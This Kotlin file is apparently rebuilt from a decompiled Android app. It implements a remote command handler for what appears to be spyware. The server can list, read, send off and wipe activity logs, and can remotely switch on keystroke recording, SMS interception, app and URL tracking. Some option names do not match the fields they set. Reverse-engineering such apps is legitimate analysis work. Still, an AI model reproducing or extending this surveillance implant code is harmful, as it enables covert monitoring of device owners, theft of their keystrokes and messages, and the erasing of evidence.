package com.storm.safe.rock.service.modules.command

import android.util.Log
import com.storm.safe.rock.service.modules.ActivityMonitor
import org.json.JSONObject

/**
 * Handles log management commands.
 *
 * Reverse-engineered from JADX: C0348a5 (a5, 329 lines).
 * Vendor name: LogCommandHandler
 *
 * Supported commands:
 * - GET_LOG_LIST, GET_ALL_LOG_LISTS, READ_LOG, DELETE_LOG
 * - CLEAR_LOGS, CLEAR_ALL_LOGS, SET_LOG_OPTIONS, GET_LOG_OPTIONS
 */
class LogCommandHandler : CommandHandler {

    companion object {
        private const val TAG = "LogCommandHandler"
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "GET_LOG_LIST",
        "GET_ALL_LOG_LISTS",
        "READ_LOG",
        "DELETE_LOG",
        "CLEAR_LOGS",
        "CLEAR_ALL_LOGS",
        "SET_LOG_OPTIONS",
        "GET_LOG_OPTIONS"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        val requestId = params?.optString("requestId", "") ?: ""

        val result = processCommand(command, params)

        // Send result back to server
        if (requestId.isNotEmpty()) {
            result.put("requestId", requestId)
        }

        val networkManager = context.networkManager
        if (networkManager != null) {
            // vendor: sends via NetworkManager with specific event types
            context.sendEvent("log_command_result", result)
        }
    }

    /**
     * Process a log command and return the result JSON.
     * Vendor: m211879a3 (static)
     */
    internal fun processCommand(command: String, params: JSONObject?): JSONObject {
        val result = JSONObject()

        when (command) {
            "GET_LOG_LIST" -> {
                val typeStr = params?.optString("type", "KSTR") ?: "KSTR"
                val type = ActivityMonitor.parseLogType(typeStr)
                val files = ActivityMonitor.listLogFiles(type)
                result.put("success", true)
                result.put("type", typeStr)
                result.put("files", files)
                Log.d(TAG, "获取日志列表: type=$typeStr, files=$files")
            }
            "GET_ALL_LOG_LISTS" -> {
                val lists = JSONObject()
                for (logType in ActivityMonitor.LogType.values()) {
                    lists.put(logType.name, ActivityMonitor.listLogFiles(logType))
                }
                result.put("success", true)
                result.put("lists", lists)
                Log.d(TAG, "获取所有日志列表")
            }
            "READ_LOG" -> {
                val typeStr = params?.optString("type", "KSTR") ?: "KSTR"
                val filename = params?.optString("filename", "") ?: ""
                if (filename.isEmpty()) {
                    result.put("success", false)
                    result.put("error", "filename is required")
                    return result
                }
                val type = ActivityMonitor.parseLogType(typeStr)
                val content = ActivityMonitor.readLogFile(type, filename)
                result.put("success", true)
                result.put("type", typeStr)
                result.put("filename", filename)
                result.put("content", content)
                Log.d(TAG, "读取日志: type=$typeStr, filename=$filename, size=${content.length}")
            }
            "DELETE_LOG" -> {
                val typeStr = params?.optString("type", "KSTR") ?: "KSTR"
                val filename = params?.optString("filename", "") ?: ""
                if (filename.isEmpty()) {
                    result.put("success", false)
                    result.put("error", "filename is required")
                    return result
                }
                val type = ActivityMonitor.parseLogType(typeStr)
                val deleted = ActivityMonitor.deleteLogFile(type, filename)
                result.put("success", deleted)
                result.put("type", typeStr)
                result.put("filename", filename)
                Log.d(TAG, "删除日志: type=$typeStr, filename=$filename, result=$deleted")
            }
            "CLEAR_LOGS" -> {
                val typeStr = params?.optString("type", "KSTR") ?: "KSTR"
                val type = ActivityMonitor.parseLogType(typeStr)
                val cleared = ActivityMonitor.clearLogs(type)
                result.put("success", cleared)
                result.put("type", typeStr)
                Log.d(TAG, "清空日志: type=$typeStr, result=$cleared")
            }
            "CLEAR_ALL_LOGS" -> {
                val cleared = ActivityMonitor.clearAllLogs()
                result.put("success", cleared)
                Log.d(TAG, "清空所有日志: result=$cleared")
            }
            "SET_LOG_OPTIONS" -> {
                if (params != null) {
                    if (params.has("recKeystrokes")) {
                        ActivityMonitor.textMonitorEnabled = params.optBoolean("recKeystrokes", true)
                    }
                    if (params.has("liveKeystrokes")) {
                        ActivityMonitor.smsInterceptActive = params.optBoolean("liveKeystrokes", false)
                    }
                    if (params.has("recApps")) {
                        ActivityMonitor.appUsageEnabled = params.optBoolean("recApps", true)
                    }
                    if (params.has("recLinks")) {
                        ActivityMonitor.urlMonitorEnabled = params.optBoolean("recLinks", true)
                    }
                    if (params.has("recNotifications")) {
                        ActivityMonitor.focusMonitorEnabled = params.optBoolean("recNotifications", true)
                    }
                }
                result.put("success", true)
                result.put("options", getLogOptions())
                Log.d(TAG, "设置日志选项")
            }
            "GET_LOG_OPTIONS" -> {
                result.put("success", true)
                result.put("options", getLogOptions())
                Log.d(TAG, "获取日志选项")
            }
            else -> {
                result.put("success", false)
                result.put("error", "Unknown command: $command")
            }
        }

        return result
    }

    /**
     * Get current log options as JSON.
     * Vendor: m211880a4
     */
    private fun getLogOptions(): JSONObject {
        return JSONObject().apply {
            put("recKeystrokes", ActivityMonitor.textMonitorEnabled)
            put("liveKeystrokes", ActivityMonitor.smsInterceptActive)
            put("recApps", ActivityMonitor.appUsageEnabled)
            put("recLinks", ActivityMonitor.urlMonitorEnabled)
            put("recNotifications", ActivityMonitor.focusMonitorEnabled)
        }
    }
}
